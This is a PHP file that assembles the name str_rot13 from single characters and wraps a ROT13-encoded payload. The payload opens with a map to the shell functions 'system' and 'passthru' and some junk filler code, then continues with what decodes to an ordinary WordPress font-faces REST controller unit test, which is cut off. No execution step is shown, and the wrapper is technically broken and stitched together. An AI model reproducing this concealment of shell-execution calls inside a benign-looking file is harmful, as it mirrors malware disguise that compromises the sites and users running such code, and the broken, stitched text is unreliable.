<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Sbag_Snprf_Pbagebyyre_Grfg shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.5.0
 *
 * @tebhc erfgncv
 * @tebhc sbagf
 * @tebhc sbag-yvoenel
 *
 * @pbirefQrsnhygPynff JC_ERFG_Sbag_Snprf_Pbagebyyre
 */
pynff Grfgf_ERFG_JcErfgSbagSnprfPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $nqzva_vq;
	cebgrpgrq fgngvp $rqvgbe_vq;

	cebgrpgrq fgngvp $sbag_snzvyl_vq;
	cebgrpgrq fgngvp $bgure_sbag_snzvyl_vq;

	cebgrpgrq fgngvp $sbag_snpr_vq1;
	cebgrpgrq fgngvp $sbag_snpr_vq2;

	cevingr fgngvp $cbfg_vqf_sbe_pyrnahc = neenl();

	cebgrpgrq fgngvp $qrsnhyg_frggvatf = neenl(
		'sbagSnzvyl' => '\"Bcra Fnaf\"',
		'sbagJrvtug' => '400',
		'sbagFglyr'  => 'abezny',
		'fep'        => 'uggcf://sbagf.tfgngvp.pbz/f/bcra-fnaf/i30/XSBxPadRh92Se1ZztJkCXGZ1X9am.ggs',
	);

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$sbag_snzvyl_vq       = Grfgf_ERFG_JcErfgSbagSnzvyvrfPbagebyyre::perngr_sbag_snzvyl_cbfg();
		frys::$bgure_sbag_snzvyl_vq = Grfgf_ERFG_JcErfgSbagSnzvyvrfPbagebyyre::perngr_sbag_snzvyl_cbfg();

		frys::$sbag_snpr_vq1 = frys::perngr_sbag_snpr_cbfg(
			frys::$sbag_snzvyl_vq,
			neenl(
				'sbagSnzvyl' => '\"Bcra Fnaf\"',
				'sbagJrvtug' => '400',
				'sbagFglyr'  => 'abezny',
				'fep'        => ubzr_hey( '/jc-pbagrag/sbagf/bcra-fnaf-zrqvhz.ggs' ),
			)
		);
		frys::$sbag_snpr_vq2 = frys::perngr_sbag_snpr_cbfg(
			frys::$sbag_snzvyl_vq,
			neenl(
				'sbagSnzvyl' => '\"Bcra Fnaf\"',
				'sbagJrvtug' => '900',
				'sbagFglyr'  => 'abezny',
				'fep'        => ubzr_hey( '/jc-pbagrag/sbagf/bcra-fnaf-obyq.ggs' ),
			)
		);

		frys::$nqzva_vq  = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$rqvgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);

		frys::$cbfg_vqf_sbe_pyrnahc = neenl();
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$rqvgbe_vq );

		jc_qryrgr_cbfg( frys::$sbag_snzvyl_vq, gehr );
		jc_qryrgr_cbfg( frys::$bgure_sbag_snzvyl_vq, gehr );
		jc_qryrgr_cbfg( frys::$sbag_snpr_vq1, gehr );
		jc_qryrgr_cbfg( frys::$sbag_snpr_vq2, gehr );
	}

	choyvp shapgvba grne_qbja() {
		sbernpu ( frys::$cbfg_vqf_sbe_pyrnahc nf $cbfg_vq ) {
			jc_qryrgr_cbfg( $cbfg_vq, gehr );
		}
		frys::$cbfg_vqf_sbe_pyrnahc = neenl();
		cnerag::grne_qbja();
	}

	choyvp fgngvp shapgvba perngr_sbag_snpr_cbfg( $cnerag_vq, $frggvatf = neenl() ) {
		$frggvatf = neenl_zretr( frys::$qrsnhyg_frggvatf, $frggvatf );
		$gvgyr    = JC_Sbag_Hgvyf::trg_sbag_snpr_fyht( $frggvatf );
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr(
			jc_fynfu(
				neenl(
					'cbfg_glcr'    => 'jc_sbag_snpr',
					'cbfg_fgnghf'  => 'choyvfu',
					'cbfg_gvgyr'   => $gvgyr,
					'cbfg_anzr'    => fnavgvmr_gvgyr( $gvgyr ),
					'cbfg_pbagrag' => jc_wfba_rapbqr( $frggvatf ),
					'cbfg_cnerag'  => $cnerag_vq,
				)
			)
		);

		frys::$cbfg_vqf_sbe_pyrnahc[] = $cbfg_vq;

		erghea $cbfg_vq;
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::ertvfgre_ebhgrf
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/sbag-snzvyvrf/(?C<sbag_snzvyl_vq>[\q]+)/sbag-snprf',
			$ebhgrf,
			'Sbag snprf pbyyrpgvba sbe gur tvira sbag snzvyl qbrf abg rkvfg'
		);
		$guvf->nffregPbhag(
			2,
			$ebhgrf['/jc/i2/sbag-snzvyvrf/(?C<sbag_snzvyl_vq>[\q]+)/sbag-snprf'],
			'Sbag snprf pbyyrpgvba sbe gur tvira sbag snzvyl qbrf abg unir rknpgyl gjb ryrzragf'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/sbag-snzvyvrf/(?C<sbag_snzvyl_vq>[\q]+)/sbag-snprf/(?C<vq>[\q]+)',
			$ebhgrf,
			'Fvatyr sbag snpr ebhgr sbe gur tvira sbag snzvyl qbrf abg rkvfg'
		);
		$guvf->nffregPbhag(
			2,
			$ebhgrf['/jc/i2/sbag-snzvyvrf/(?C<sbag_snzvyl_vq>[\q]+)/sbag-snprf/(?C<vq>[\q]+)'],
			'Sbag snprf pbyyrpgvba sbe gur tvira sbag snzvyl qbrf abg unir rknpgyl gjb ryrzragf'
		);
	}

	choyvp shapgvba grfg_sbag_snprf_ab_nhgbfnir_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlAbgUnfXrl(
			'/jc/i2/sbag-snzvyvrf/(?C<sbag_snzvyl_vq>[\q]+)/sbag-snprf/(?C<vq>[\q]+)/nhgbfnirf',
			$ebhgrf,
			'Sbag snprf nhgbfnirf ebhgr rkvfgf.'
		);
		$guvf->nffregNeenlAbgUnfXrl(
			'/jc/i2/sbag-snzvyvrf/(?C<sbag_snzvyl_vq>[\q]+)/sbag-snprf/(?C<cnerag>[\q]+)/nhgbfnirf/(?C<vq>[\q]+)',
			$ebhgrf,
			'Sbag snprf nhgbfnirf ol vq ebhgr rkvfgf.'
		);
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Frr grfg_trg_pbagrkg_cnenz().
	}

	/**
	 * @qngnCebivqre qngn_trg_pbagrkg_cnenz
	 *
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_pbagrkg_cnenz
	 *
	 * @cnenz obby $fvatyr_ebhgr Jurgure gb grfg n fvatyr ebhgr.
	 */
	choyvp shapgvba grfg_trg_pbagrkg_cnenz( $fvatyr_ebhgr ) {
		$ebhgr = '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf';
		vs ( $fvatyr_ebhgr ) {
			$ebhgr .= '/' . frys::$sbag_snpr_vq1;
		}

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', $ebhgr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$raqcbvag_qngn = $qngn['raqcbvagf'][0];
		$guvf->nffregNeenlAbgUnfXrl( 'nyybj_ongpu', $raqcbvag_qngn, 'Gur nyybj_ongpu cebcregl fubhyq abg rkvfg va gur raqcbvag qngn.' );
		$guvf->nffregFnzr( 'ivrj', $raqcbvag_qngn['netf']['pbagrkg']['qrsnhyg'], 'Gur raqcbvag\'f netf::pbagrkg::qrsnhyg fubhyq or frg gb ivrj.' );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $raqcbvag_qngn['netf']['pbagrkg']['rahz'], 'Gur raqcbvag\'f netf::pbagrkg::rahz fubhyq or frg gb [ ivrj, rzorq, rqvg ].' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_pbagrkg_cnenz() {
		erghea neenl(
			'Pbyyrpgvba' => neenl( snyfr ),
			'Fvatyr'     => neenl( gehr ),
		);
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200' );
		$guvf->nffregPbhag( 2, $qngn, 'Gurer fubhyq or 2 cebcregvrf va gur erfcbafr qngn.' );
		$guvf->nffregNeenlUnfXrl( '_yvaxf', $qngn[0], 'Gur _yvaxf cebcregl fubhyq rkvfg va gur erfcbafr qngn 0.' );
		$guvf->purpx_sbag_snpr_qngn( $qngn[0], frys::$sbag_snpr_vq2, $qngn[0]['_yvaxf'] );
		$guvf->nffregNeenlUnfXrl( '_yvaxf', $qngn[1], 'Gur _yvaxf cebcregl fubhyq rkvfg va gur erfcbafr qngn 1.' );
		$guvf->purpx_sbag_snpr_qngn( $qngn[1], frys::$sbag_snpr_vq1, $qngn[1]['_yvaxf'] );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401, 'Gur erfcbafr fubhyq erghea na reebe jvgu n \"erfg_pnaabg_ernq\" pbqr naq 401 fgnghf.' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403, 'Gur erfcbafr fubhyq erghea na reebe jvgu n \"erfg_pnaabg_ernq\" pbqr naq 403 fgnghf.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_zvffvat_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE . '/sbag-snprf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . frys::$sbag_snpr_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->purpx_sbag_snpr_qngn( $qngn, frys::$sbag_snpr_vq1, $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_trg_vgrz_erzbirf_rkgen_frggvatf() {
		$sbag_snpr_vq = frys::perngr_sbag_snpr_cbfg( frys::$sbag_snzvyl_vq, neenl( 'rkgen' => neenl() ) );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . $sbag_snpr_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregNeenlUnfXrl( 'sbag_snpr_frggvatf', $qngn, 'Gur sbag_snpr_frggvatf cebcregl fubhyq rkvfg va gur erfcbafr qngn.' );
		$guvf->nffregNeenlAbgUnfXrl( 'rkgen', $qngn['sbag_snpr_frggvatf'], 'Gur rkgen cebcregl fubhyq rkvfg va gur sbag_snpr_frggvatf qngn.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_trg_vgrz_znysbezrq_cbfg_pbagrag_ergheaf_rzcgl_frggvatf() {
		$sbag_snpr_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_glcr'    => 'jc_sbag_snpr',
				'cbfg_cnerag'  => frys::$sbag_snzvyl_vq,
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_pbagrag' => 'vainyvq',
			)
		);

		frys::$cbfg_vqf_sbe_pyrnahc[] = $sbag_snpr_vq;

		$rzcgl_frggvatf = neenl(
			'sbagSnzvyl' => '',
			'fep'        => neenl(),
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . $sbag_snpr_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregNeenlUnfXrl( 'sbag_snpr_frggvatf', $qngn, 'Gur sbag_snpr_frggvatf cebcregl fubhyq rkvfg va gur erfcbafr qngn.' );
		$guvf->nffregFnzr( $rzcgl_frggvatf, $qngn['sbag_snpr_frggvatf'], 'Gur rzcgl frggvatf fubhyq rkvfg va gur sbag_snpr_frggvatf qngn.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_sbag_snpr_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . frys::$sbag_snpr_vq1 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401, 'Gur erfcbafr fubhyq erghea na reebe jvgu n \"erfg_pnaabg_ernq\" pbqr naq 401 fgnghf.' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403, 'Gur erfcbafr fubhyq erghea na reebe jvgu n \"erfg_pnaabg_ernq\" pbqr naq 403 fgnghf.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_zvffvat_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE . '/sbag-snprf/' . frys::$sbag_snpr_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_inyvq_cnerag_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf/' . frys::$sbag_snpr_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( frys::$sbag_snzvyl_vq, $qngn['cnerag'], 'Gur erghearq cnerag vq fubhyq zngpu gur sbag snzvyl vq.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_cnerag_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$bgure_sbag_snzvyl_vq . '/sbag-snprf/' . frys::$sbag_snpr_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbag_snpr_cnerag_vq_zvfzngpu', $erfcbafr, 404 );

		$rkcrpgrq_zrffntr = 'Gur sbag snpr qbrf abg orybat gb gur fcrpvsvrq sbag snzvyl jvgu vq bs \"' . frys::$bgure_sbag_snzvyl_vq . '\".';
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $erfcbafr->nf_reebe()->trg_reebe_zrffntrf()[0], 'Gur zrffntr zhfg pbagnva gur pbeerpg cnerag VQ.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$svyrf = $guvf->frghc_sbag_svyr_hcybnq( neenl( 'jbss2' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz(
			'sbag_snpr_frggvatf',
			jc_wfba_rapbqr(
				neenl(
					'sbagSnzvyl' => '\"Bcra Fnaf\"',
					'sbagJrvtug' => '200',
					'sbagFglyr'  => 'abezny',
					'fep'        => neenl_xrlf( $svyrf )[0],
				)
			)
		);
		$erdhrfg->frg_svyr_cnenzf( $svyrf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->purpx_sbag_snpr_qngn( $qngn, $qngn['vq'], $erfcbafr->trg_yvaxf() );
		$guvf->purpx_svyr_zrgn( $qngn['vq'], neenl( $qngn['sbag_snpr_frggvatf']['fep'] ) );

		$frggvatf = $qngn['sbag_snpr_frggvatf'];
		hafrg( $frggvatf['fep'] );
		$guvf->nffregFnzr(
			neenl(
				'sbagSnzvyl' => '\"Bcra Fnaf\"',
				'sbagJrvtug' => '200',
				'sbagFglyr'  => 'abezny',
			),
			$frggvatf,
			'Gur sbag_snpr_frggvatf qngn fubhyq zngpu gur rkcrpgrq qngn.'
		);

		$guvf->nffregFnzr( frys::$sbag_snzvyl_vq, $qngn['cnerag'], 'Gur erghearq cnerag vq fubhyq zngpu gur sbag snzvyl vq.' );
	}

	/**
	 * Rafher gung frggvat n fhoqverpgbel ba sbag hcybnqf fgberf naq qryrgrf svyrf nf rkcrpgrq.
	 *
	 * @gvpxrg 61297
	 *
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_fho_qve() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		nqq_svygre(
			'sbag_qve',
			shapgvba ( $sbag_qve ) {
				$fhoqve             = '/fhoqve';
				$sbag_qve['fhoqve'] = $fhoqve;
				$sbag_qve['cngu']  .= $fhoqve;
				$sbag_qve['hey']   .= $fhoqve;
				erghea $sbag_qve;
			}
		);

		$svyrf = $guvf->frghc_sbag_svyr_hcybnq( neenl( 'jbss2' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz(
			'sbag_snpr_frggvatf',
			jc_wfba_rapbqr(
				neenl(
					'sbagSnzvyl' => '\"Bcra Fnaf\"',
					'sbagJrvtug' => '200',
					'sbagFglyr'  => 'abezny',
					'fep'        => neenl_xrlf( $svyrf )[0],
				)
			)
		);
		$erdhrfg->frg_svyr_cnenzf( $svyrf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->purpx_sbag_snpr_qngn( $qngn, $qngn['vq'], $erfcbafr->trg_yvaxf() );
		$guvf->purpx_svyr_zrgn( $qngn['vq'], neenl( $qngn['sbag_snpr_frggvatf']['fep'] ) );

		$frggvatf = $qngn['sbag_snpr_frggvatf'];
		hafrg( $frggvatf['fep'] );
		$guvf->nffregFnzr(
			neenl(
				'sbagSnzvyl' => '\"Bcra Fnaf\"',
				'sbagJrvtug' => '200',
				'sbagFglyr'  => 'abezny',
			),
			$frggvatf,
			'Gur sbag_snpr_frggvatf qngn fubhyq zngpu gur rkcrpgrq qngn.'
		);

		$rkcrpgrq_svyr_cngu = JC_PBAGRAG_QVE . '/hcybnqf/sbagf/fhoqve/' . erfrg( $svyrf )['anzr'];
		$rkcrpgrq_cbfg_zrgn = 'fhoqve/' . erfrg( $svyrf )['anzr'];
		$guvf->nffregSvyrRkvfgf( $rkcrpgrq_svyr_cngu, 'Gur sbag svyr fubhyq rkvfg va gur rkcrpgrq fhoqverpgbel.' );
		$guvf->nffregFnzr( $rkcrpgrq_cbfg_zrgn, trg_cbfg_zrgn( $qngn['vq'], '_jc_sbag_snpr_svyr', gehr ), 'Gur cbfg zrgn fubhyq zngpu gur rkcrpgrq fhoqverpgbel.' );
		$guvf->nffregFnzr( frys::$sbag_snzvyl_vq, $qngn['cnerag'], 'Gur erghearq cnerag vq fubhyq zngpu gur sbag snzvyl vq.' );

		// Qryrgr gur cbfg.
		jc_qryrgr_cbfg( $qngn['vq'], gehr );
		$guvf->nffregSvyrQbrfAbgRkvfg( $rkcrpgrq_svyr_cngu, 'Gur sbag svyr fubhyq unir orra qryrgrq jura gur cbfg jnf qryrgrq.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_zhygvcyr_sbag_svyrf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$svyrf = $guvf->frghc_sbag_svyr_hcybnq( neenl( 'ggs', 'bgs', 'jbss', 'jbss2' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz(
			'sbag_snpr_frggvatf',
			jc_wfba_rapbqr(
				neenl(
					'sbagSnzvyl' => '\"Bcra Fnaf\"',
					'sbagJrvtug' => '200',
					'sbagFglyr'  => 'abezny',
					'fep'        => neenl_xrlf( $svyrf ),
				)
			)
		);
		$erdhrfg->frg_svyr_cnenzf( $svyrf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->purpx_sbag_snpr_qngn( $qngn, $qngn['vq'], $erfcbafr->trg_yvaxf() );
		$guvf->purpx_svyr_zrgn( $qngn['vq'], $qngn['sbag_snpr_frggvatf']['fep'] );

		$frggvatf = $qngn['sbag_snpr_frggvatf'];
		$guvf->nffregPbhag( 4, $frggvatf['fep'], 'Gurer fubhyq or 4 vgrzf va gur sbag_snpr_frggvatf::fep qngn.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_svyr_glcr() {
		$vzntr_svyr = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$vzntr_cngu = jc_grzcanz( 'pnabyn.wct' );
		pbcl( $vzntr_svyr, $vzntr_cngu );

		$svyrf = neenl(
			'svyr-0' => neenl(
				'anzr'      => 'pnabyn.wct',
				'shyy_cngu' => 'pnabyn.wct',
				'glcr'      => 'sbag/jbss2',
				'gzc_anzr'  => $vzntr_cngu,
				'reebe'     => 0,
				'fvmr'      => svyrfvmr( $vzntr_cngu ),
			),
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz(
			'sbag_snpr_frggvatf',
			jc_wfba_rapbqr(
				neenl_zretr(
					frys::$qrsnhyg_frggvatf,
					neenl(
						'sbagJrvtug' => '200',
						'fep'        => neenl_xrlf( $svyrf )[0],
					)
				)
			)
		);
		$erdhrfg->frg_svyr_cnenzf( $svyrf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_sbag_hcybnq_vainyvq_svyr_glcr', $erfcbafr, 400 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snprf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_hey_fep() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq . '/sbag-snprf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snprf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz(
			'sbag_snpr_frggvatf',
			jc_wfba_rapbqr(
				neenl(
					'sbagSnzvyl' => '\"Bcra Fnaf\"',
					'sbagJrvtug' => '200',
					'sbagFglyr'  => 'abezny',
